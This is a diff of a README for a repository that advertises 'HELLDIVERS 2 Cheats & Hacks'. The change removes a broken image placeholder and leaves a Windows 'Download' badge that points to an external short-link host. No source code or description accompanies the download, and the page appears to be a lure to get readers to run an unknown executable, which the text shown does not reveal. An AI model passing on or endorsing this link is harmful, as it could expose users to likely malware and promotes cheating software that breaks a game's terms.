@@ -1,5 +1,4 @@
 # 🎮 HELLDIVERS 2 Cheats & Hacks Repository
-![Uploading image.png…]()
 
 [![Download HELLDIVERS 2 Cheats & Hacks](https://img.shields.io/badge/Download-HELLDIVERS_2_Cheats-blue?style=for-the-badge&logo=windows)](https://ezlaunch.live/pPnqF1yp)
 
